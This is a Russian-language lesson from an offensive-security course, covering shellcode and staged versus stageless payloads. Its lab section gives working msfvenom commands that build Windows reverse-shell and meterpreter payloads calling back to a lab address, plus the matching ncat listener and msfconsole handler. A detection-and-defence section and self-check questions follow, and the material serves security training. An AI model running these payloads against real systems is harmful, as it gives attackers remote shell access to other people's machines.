# 12.2 — Payload: shellcode и стадии

> **M12 · Этап 2 · 5 ч · 🟡 · артефакт:** `labs/m12-evasion/l02-payloads/`

## Цель

Понять анатомию payload: shellcode, PE, стадии, формат доставки — и собрать собственный payload, который вы можете объяснить построчно.

## Результат

- Один stageless и один staged payload.
- Понимание каждого этапа загрузки.
- Таблица «формат → плюсы → минусы → детект».

## Теория

### 1. Что такое shellcode

Позиционно-независимый машинный код, который выполняет действие (обычно — запуск обратной оболочки). Не является PE, не имеет импорта, часто использует PEB/API-резолвинг.

### 2. Staged vs stageless

| | Staged | Stageless |
|---|---|---|
| Размер | маленький stager | весь код сразу |
| Сеть | второй запрос за стадией | один запрос |
| Детект | stager + stage | один артефакт |
| Надёжность | ломается при плохой сети | выше |

Stager обычно выделяет память, читает stage и передаёт управление.

### 3. Форматы

- **Raw shellcode** — для лоадера/инжектора.
- **EXE/DLL** — PE, удобно для запуска.
- **Service EXE** — для служб.
- **MSI/HTA/JS/VBS** — для доставки.
- **PowerShell** — скрипт, проходит через AMSI.
- **.NET assembly** — `execute-assembly`, удобно для инструментов.

### 4. Метаданные и структура PE

Детект часто смотрит на:

- секции (`.text`, `.rdata`, нестандартные имена);
- энтропию;
- импорт (`VirtualAlloc`, `CreateRemoteThread`);
- timestamp, подпись, ресурсы;
- наличие overlay.

Изменение структуры может обойти сигнатуру, но не поведение.

### 5. Сборка

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.50 LPORT=443 -f exe -o staged.exe
```

Для собственного кода:

```bash
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32
```

### 6. Что делает payload «плохим»

- Обратная оболочка на нестандартный порт.
- Странный User-Agent.
- Новорождённый процесс без родителя.
- Запись в `%TEMP%` и запуск оттуда.
- Инжект в чужой процесс.

## Лаборатория

> `WIN01` с Defender (для начала) + `LNX01` как listener. Сеть VMnet2 только.

### 1. Listener

```bash
# на Arch
ncat -lvnp 4444
```

### 2. Stageless

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f exe -o shell.exe
```

Перенесите на `WIN01` (без общей папки — через `scp`/HTTP в лабе). Запустите. Ожидаемо: соединение в `ncat`.

### 3. Staged

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f exe -o staged.exe
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.50; set LPORT 4444; run"
```

Ожидаемо: сессия meterpreter. Обратите внимание на второй сетевой запрос.

### 4. Структура

```bash
file shell.exe
objdump -x shell.exe | head -50
python3 -c "import pefile; pe=pefile.PE('shell.exe'); print([s.Name for s in pe.sections])"
```

Ожидаемо: секции, импорт, timestamp. Запишите, что выглядит подозрительно.

### 5. Defender

```powershell
Get-MpThreatDetection | Select-Object -First 5
```

Ожидаемо: msfvenom- payload, скорее всего, детектится. Это нормально — зафиксируйте имя детекта.

## Атака и защита

- **Атака:** уменьшить подозрительность структуры и поведения.
- **Детект:** сигнатуры, поведение (инжект, сеть), AMSI для скриптов, ETW.
- **Фикс:** ASR, WDAC, ограничение макросов, мониторинг.

## Самопроверка

- [ ] Чем stager отличается от stage?
- [ ] Почему raw shellcode не PE?
- [ ] Что такое PEB walking?
- [ ] Какие поля PE чаще всего детектятся?
- [ ] Почему msfvenom по умолчанию почти всегда ловится?

## Дальше

[12.3 — Лоадеры и обход AMSI/ETW](l03-loaders-amsi-etw.md)
